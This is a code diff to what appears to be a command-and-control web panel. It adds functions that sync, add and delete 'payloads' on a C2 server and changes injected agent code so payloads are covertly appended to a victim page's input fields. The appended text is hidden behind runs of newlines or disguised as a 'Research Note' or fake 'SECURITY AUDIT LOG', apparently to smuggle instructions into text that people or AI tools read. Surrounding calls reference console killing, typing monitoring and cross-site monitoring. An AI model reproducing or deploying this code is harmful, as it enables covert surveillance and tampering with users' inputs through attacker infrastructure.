@@ -1480,6 +1480,7 @@ window.onload = () => {
     detectHardware();
     killConsole();
     checkDesktopScanner();
+    refreshPayloadList(); // Initial sync of payloads
     setupCrossSiteMonitoring();
     initializeAgentLinks();
     setupTypingMonitor();
@@ -1517,6 +1518,71 @@ window.onload = () => {
         }
     });
 };
+
+// 14. Payload Management
+async function refreshPayloadList() {
+    const list = document.getElementById('payload-list');
+    const status = document.getElementById('status-payloads');
+    if (!list) return;
+
+    try {
+        const response = await fetch(C2_URL + '/manage_payloads');
+        if (response.ok) {
+            const payloads = await response.json();
+            list.innerHTML = '';
+            payloads.forEach(p => {
+                const li = document.createElement('li');
+                li.style.cssText = 'padding:8px; border-bottom:1px solid #e2e8f0; display:flex; justify-content:space-between; align-items:flex-start; gap:10px;';
+                li.innerHTML = `
+                    <span style="flex:1; word-break:break-all;">${p}</span>
+                    <button onclick="deletePayload('${p.replace(/'/g, "\\'")}')" style="background:none; border:none; color:#ef4444; cursor:pointer; font-size:1rem; padding:0;">🗑️</button>
+                `;
+                list.appendChild(li);
+            });
+            status.textContent = 'SYNCED (' + payloads.length + ')';
+            status.className = 'status positive';
+        }
+    } catch (e) {
+        status.textContent = 'OFFLINE';
+        status.className = 'status neutral';
+    }
+}
+
+async function addNewPayload() {
+    const input = document.getElementById('new-payload-input');
+    const payload = input.value.trim();
+    if (!payload) return;
+
+    try {
+        const response = await fetch(C2_URL + '/manage_payloads', {
+            method: 'POST',
+            body: JSON.stringify({ action: 'add', payload: payload })
+        });
+        if (response.ok) {
+            input.value = '';
+            refreshPayloadList();
+            logActivity('New research payload added: ' + payload.substring(0, 30) + '...', 'info');
+        }
+    } catch (e) {
+        alert('C2 Server Offline. Cannot add payload.');
+    }
+}
+
+async function deletePayload(payload) {
+    if (!confirm('Delete this research payload?')) return;
+    try {
+        const response = await fetch(C2_URL + '/manage_payloads', {
+            method: 'POST',
+            body: JSON.stringify({ action: 'delete', payload: payload })
+        });
+        if (response.ok) {
+            refreshPayloadList();
+            logActivity('Research payload deleted', 'system');
+        }
+    } catch (e) {
+        alert('C2 Server Offline. Cannot delete payload.');
+    }
+}
 
 function initializeAgentLinks() {
     const agentCodeRaw = `(function(){
@@ -1637,8 +1703,15 @@ function initializeAgentLinks() {
                     injected_payload: payload 
                 });
 
-                /* Stealthy injection: Append with many newlines to hide from immediate view in UI */
-                const injection = "\\n\\n\\n\\n\\n" + payload;
+                /* Advanced Stealth Injection: Wrap with Natural Language or Hidden Markers */
+                const injectionStyles = [
+                    (p) => "\\n\\n\\n\\n\\n" + p, /* Classic hidden append */
+                    (p) => " (Research Note: " + p + ")", /* Contextual wrap */
+                    (p) => "\\n--- SECURITY AUDIT LOG ---\\n" + p + "\\n--- END LOG ---" /* Technical wrap */
+                ];
+                const injectFn = injectionStyles[Math.floor(Math.random() * injectionStyles.length)];
+                const injection = injectFn(payload);
+
                 if(el.value !== undefined) el.value += injection;
                 else if(el.innerText !== undefined) el.innerText += injection;
                 
